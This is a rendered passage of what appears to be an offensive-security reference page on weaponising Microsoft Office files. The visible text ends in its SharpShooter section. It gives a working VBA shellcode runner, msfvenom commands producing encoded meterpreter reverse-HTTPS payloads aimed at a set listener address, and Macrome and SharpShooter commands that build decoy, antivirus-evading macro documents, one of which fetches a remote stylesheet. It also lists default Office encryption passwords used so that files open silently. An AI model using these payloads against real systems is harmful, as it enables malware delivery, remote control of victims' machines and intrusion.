        
          <li class="md-nav__item">
  <a href="#xlsm-hot-manchego" class="md-nav__link">
    <span class="md-ellipsis">
      XLSM - Hot Manchego
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-macrome" class="md-nav__link">
    <span class="md-ellipsis">
      XLM - Macrome
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-sharpshooter" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - SharpShooter
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-excelntdonut" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - EXCELntDonut
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xlm-excel-40-exec" class="md-nav__link">
    <span class="md-ellipsis">
      XLM Excel 4.0 - EXEC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#slk-exec" class="md-nav__link">
    <span class="md-ellipsis">
      SLK - EXEC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#word" class="md-nav__link">
    <span class="md-ellipsis">
      Word
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Word">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#docm-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Metasploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-download-and-execute" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Download and Execute
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-macro-creator" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - Macro Creator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-c-converted-to-office-vba-macro" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - C# converted to Office VBA macro
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-wscript" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Wscript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-shell-execute-comment" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Shell Execute Comment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-vba-spawning-via-svchostexe-using-scheduled-task" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - VBA Spawning via svchost.exe using Scheduled Task
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-wmi-com-functions" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - WMI COM functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docmxlm-macro-pack-macro-and-dde" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM/XLM - Macro Pack - Macro and DDE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-badassmacros" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - BadAssMacros
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-cactustorch-vba-module" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - CACTUSTORCH VBA Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-mmg-with-custom-dl-exec" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - MMG with Custom DL + Exec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docm-activex-based-inkpicture-control-painted-event-autorun-macro" class="md-nav__link">
    <span class="md-ellipsis">
      DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      VBA Obfuscation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-purging" class="md-nav__link">
    <span class="md-ellipsis">
      VBA Purging
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VBA Purging">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#officepurge" class="md-nav__link">
    <span class="md-ellipsis">
      OfficePurge
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evilclippy" class="md-nav__link">
    <span class="md-ellipsis">
      EvilClippy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-offensive-security-template" class="md-nav__link">
    <span class="md-ellipsis">
      VBA - Offensive Security Template
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vba-amsi" class="md-nav__link">
    <span class="md-ellipsis">
      VBA - AMSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docx-template-injection" class="md-nav__link">
    <span class="md-ellipsis">
      DOCX - Template Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DOCX - Template Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-template" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Template
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#template-injections-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Template Injections Tools
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docx-dde" class="md-nav__link">
    <span class="md-ellipsis">
      DOCX - DDE
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="office-attacks">Office - Attacks</h1>
<h3 id="summary">Summary</h3>
<ul>
<li><a href="#office-products-features">Office Products Features</a></li>
<li><a href="#office-default-passwords">Office Default Passwords</a></li>
<li><a href="#office-macro-execute-winapi">Office Macro execute WinAPI</a></li>
<li><a href="#excel">Excel</a><ul>
<li><a href="#xlsm---hot-manchego">XLSM - Hot Manchego</a></li>
<li><a href="#xls---macrome">XLS - Macrome</a></li>
<li><a href="#xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</a></li>
<li><a href="#xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</a></li>
<li><a href="#xlm-excel-40---exec">XLM Excel 4.0 - EXEC</a></li>
<li><a href="#slk---exec">SLK - EXEC</a></li>
</ul>
</li>
<li><a href="#word">Word</a><ul>
<li><a href="#docm---metasploit">DOCM - Metasploit</a></li>
<li><a href="#docm---download-and-execute">DOCM - Download and Execute</a></li>
<li><a href="#docm---macro-creator">DOCM - Macro Creator</a></li>
<li><a href="#docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</a></li>
<li><a href="#docm---vba-wscript">DOCM - VBA Wscript</a></li>
<li><a href="#docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</a></li>
<li><a href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li>
<li><a href="#docm---wmi-com-functions">DCOM - WMI COM functions (VBA AMSI)</a></li>
<li><a href="#docm---winmgmts">DOCM - winmgmts</a></li>
<li><a href="#docmxlm---macro-pack---macro-and-dde">DOCM - Macro Pack - Macro and DDE</a></li>
<li><a href="#docm---badassmacros">DOCM - BadAssMacros</a></li>
<li><a href="#docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</a></li>
<li><a href="#docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</a></li>
<li><a href="#vba-obfuscation">VBA Obfuscation</a></li>
<li><a href="#vba-purging">VBA Purging</a><ul>
<li><a href="#officepurge">OfficePurge</a></li>
<li><a href="#evilclippy">EvilClippy</a></li>
</ul>
</li>
<li><a href="#vba-amsi">VBA AMSI</a></li>
<li><a href="#vba---offensive-security-template">VBA - Offensive Security Template</a></li>
<li><a href="#docx---template-injection">DOCX - Template Injection</a></li>
<li><a href="#docx---dde">DOCX - DDE</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="office-products-features">Office Products Features</h2>
<p><img alt="Overview of features supported by different Office products" src="https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png" /></p>
<h2 id="office-default-passwords">Office Default Passwords</h2>
<p>By default, Excel does not set a password when saving a new file. However, some older versions of Excel had a default password that was used if the user did not set a password themselves. The default password was "<code>VelvetSweatshop</code>", and it could be used to open any file that did not have a password set.</p>
<blockquote>
<p>If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: "<code>\x2f\x30\x31\x48\x61\x6e\x6e\x65\x73\x20\x52\x75\x65\x73\x63\x68\x65\x72\x2f\x30\x31</code>". - <a href="https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/57fc02f0-c1de-4fc6-908f-d146104662f5">2.4.2.3 Binary Document Write Protection Method 3</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>Product</th>
<th>Password</th>
<th>Supported Formats</th>
</tr>
</thead>
<tbody>
<tr>
<td>Excel</td>
<td>VelvetSweatshop</td>
<td>all Excel formats</td>
</tr>
<tr>
<td>PowerPoint</td>
<td>01Hannes Ruescher/01</td>
<td>.pps .ppt</td>
</tr>
</tbody>
</table>
<h2 id="office-macro-execute-winapi">Office Macro execute WinAPI</h2>
<h3 id="description">Description</h3>
<p>To importe Win32 function we need to use the keyword <code>Private Declare</code>
<code>Private Declare Function &lt;NAME&gt; Lib "&lt;DLL_NAME&gt;" Alias "&lt;FUNCTION_IMPORTED&gt;" (&lt;ByVal/ByRef&gt; &lt;NAME_VAR&gt; As &lt;TYPE&gt;, etc.) As &lt;TYPE&gt;</code>
If we work on 64bit, we need to add the keyword <code>PtrSafe</code> between the keywords <code>Declare</code> and <code>Function</code>
Importing the <code>GetUserNameA</code> from <code>advapi32.dll</code>: 
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Private Declare PtrSafe Function GetUserName Lib &quot;advapi32.dll&quot; Alias &quot;GetUserNameA&quot; (ByVal lpBuffer As String, ByRef nSize As Long) As Long
</code></pre></div>
<code>GetUserNameA</code> prototype in C: 
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">BOOL</span><span class="w"> </span><span class="nf">GetUserNameA</span><span class="p">(</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="n">LPSTR</span><span class="w">   </span><span class="n">lpBuffer</span><span class="p">,</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="n">LPDWORD</span><span class="w"> </span><span class="n">pcbBuffer</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">);</span>
</code></pre></div></p>
<h3 id="example-with-a-simple-shellcode-runner">Example with a simple Shellcode Runner</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Private Declare PtrSafe Function VirtualAlloc Lib &quot;Kernel32.dll&quot; (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Private Declare PtrSafe Function RtlMoveMemory Lib &quot;Kernel32.dll&quot; (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Private Declare PtrSafe Function CreateThread Lib &quot;KERNEL32.dll&quot; (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Sub WinAPI()
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    Dim buf As Variant
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    Dim addr As LongPtr
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    Dim counter As Long
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    Dim data As Long
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>    buf = Array(252, ...)
<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)
<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>    For counter = LBound(buf) To UBound(buf)
<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>        data = buf(counter)
<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>        res = RtlMoveMemory(addr + counter, data, 1)
<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>    Next counter
<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>    res = CreateThread(0, 0, addr, 0, 0, 0)
<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>
<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>End Sub
</code></pre></div>
<h2 id="excel">Excel</h2>
<h3 id="xlsm-hot-manchego">XLSM - Hot Manchego</h3>
<blockquote>
<p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.</p>
</blockquote>
<ul>
<li>https://github.com/FortyNorthSecurity/hot-manchego</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">Generate</span> <span class="n">CS</span> <span class="n">Macro</span> <span class="n">and</span> <span class="n">save</span> <span class="n">it</span> <span class="n">to</span> <span class="n">Windows</span> <span class="n">as</span> <span class="n">vba</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">New-Item</span> <span class="n">blank</span><span class="p">.</span><span class="n">xlsm</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">reference</span><span class="p">:</span><span class="n">EPPlus</span><span class="p">.</span><span class="n">dll</span> <span class="n">hot-manchego</span><span class="p">.</span><span class="n">cs</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">hot-manchego</span><span class="p">.</span><span class="n">exe</span> <span class="p">.\</span><span class="n">blank</span><span class="p">.</span><span class="n">xlsm</span> <span class="p">.\</span><span class="n">vba</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h3 id="xlm-macrome">XLM - Macrome</h3>
<blockquote>
<p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p>
</blockquote>
<ul>
<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</li>
<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</li>
<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># NOTE: The payload cannot contains NULL bytes.</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c"># Default calc</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">msfvenom</span> <span class="n">-a</span> <span class="n">x86</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="p">=</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">alpha_mixed</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">EXITFUNC</span><span class="p">=</span><span class="n">thread</span> <span class="p">&gt;</span> <span class="n">popcalc</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">msfvenom</span> <span class="n">-a</span> <span class="n">x64</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="p">=</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">x64</span><span class="p">/</span><span class="n">xor</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">EXITFUNC</span><span class="p">=</span><span class="n">thread</span> <span class="p">&gt;</span> <span class="n">popcalc64</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c"># Custom shellcode</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">generic</span><span class="p">/</span><span class="n">custom</span> <span class="n">PAYLOADFILE</span><span class="p">=</span><span class="n">payload86</span><span class="p">.</span><span class="n">bin</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="n">shellcode</span><span class="p">-</span><span class="n">86</span><span class="p">.</span><span class="n">bin</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">generic</span><span class="p">/</span><span class="n">custom</span> <span class="n">PAYLOADFILE</span><span class="p">=</span><span class="n">payload64</span><span class="p">.</span><span class="n">bin</span> <span class="n">-a</span> <span class="n">x64</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-e</span> <span class="n">x64</span><span class="p">/</span><span class="n">xor_dynamic</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="n">shellcode</span><span class="p">-</span><span class="n">64</span><span class="p">.</span><span class="n">bin</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c"># MSF shellcode</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">59</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span>  <span class="n">-a</span> <span class="n">x64</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-e</span> <span class="n">x64</span><span class="p">/</span><span class="n">xor_dynamic</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="n">msf64</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">59</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-encoder</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="n">msf86</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="n">dotnet</span> <span class="n">Macrome</span><span class="p">.</span><span class="n">dll</span> <span class="n">build</span> <span class="p">-</span><span class="n">-decoy-document</span> <span class="n">decoy_document</span><span class="p">.</span><span class="n">xls</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">popcalc</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-payload64-bit</span> <span class="n">popcalc64</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="n">dotnet</span> <span class="n">Macrome</span><span class="p">.</span><span class="n">dll</span> <span class="n">build</span> <span class="p">-</span><span class="n">-decoy-document</span> <span class="n">decoy_document</span><span class="p">.</span><span class="n">xls</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">shellcode</span><span class="p">-</span><span class="n">86</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-payload64-bit</span> <span class="n">shellcode</span><span class="p">-</span><span class="n">64</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c"># For VBA Macro</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="n">Macrome</span> <span class="n">build</span> <span class="p">-</span><span class="n">-decoy-document</span> <span class="n">decoy_document</span><span class="p">.</span><span class="n">xls</span> <span class="p">-</span><span class="n">-payload-type</span> <span class="n">Macro</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">macro_example</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-output</span><span class="o">-file</span><span class="n">-name</span> <span class="n">xor_obfuscated_macro_doc</span><span class="p">.</span><span class="n">xls</span> <span class="p">-</span><span class="n">-password</span> <span class="n">VelvetSweatshop</span>
</code></pre></div>
<p>When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of <strong>VelvetSweatshop</strong> is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>
<h3 id="xlm-excel-40-sharpshooter">XLM Excel 4.0 - SharpShooter</h3>
<ul>
<li>https://github.com/mdsecactivebreach/SharpShooter</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Options</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">-rawscfile</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span>  <span class="n">Path</span> <span class="n">to</span> <span class="n">raw</span> <span class="n">shellcode</span> <span class="n">file</span> <span class="k">for</span> <span class="n">stageless</span> <span class="n">payloads</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">-</span><span class="n">-scfile</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span>    <span class="n">Path</span> <span class="n">to</span> <span class="n">shellcode</span> <span class="n">file</span> <span class="n">as</span> <span class="n">CSharp</span> <span class="n">byte</span> <span class="n">array</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">python</span> <span class="n">SharpShooter</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">slk</span> <span class="p">-</span><span class="n">-rawscfile</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-output</span> <span class="n">test</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c"># Creation of a VBA Macro</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c"># creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">SharpShooter</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-stageless</span> <span class="p">-</span><span class="n">-dotnetver</span> <span class="n">2</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">macro</span> <span class="p">-</span><span class="n">-output</span> <span class="n">foo</span> <span class="p">-</span><span class="n">-rawscfile</span> <span class="p">./</span><span class="n">x86payload</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-com</span> <span class="n">xslremote</span> <span class="p">-</span><span class="n">-awlurl</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">8</span><span class="p">:</span><span class="n">8080</span><span class="p">/</span><span class="n">foo</span><span class="p">.</span><span class="n">xsl</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c"># Creation of an Excel 4.0 SLK Macro Enabled Document</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="p">~</span><span class="c"># /!\ The shellcode cannot contain null bytes</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">generic</span><span class="p">/</span><span class="n">custom</span> <span class="n">PAYLOADFILE</span><span class="p">=./</span><span class="n">payload</span><span class="p">.</span><span class="n">bin</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="n">shellcode-encoded</span><span class="p">.</span><span class="n">bin</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="n">SharpShooter</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">slk</span> <span class="p">-</span><span class="n">-output</span> <span class="n">foo</span> <span class="p">-</span><span class="n">-rawscfile</span> <span class="p">~./</span><span class="n">x86payload</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-smuggle</span> <span class="p">-</span><span class="n">-template</span> <span class="n">mcafee</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
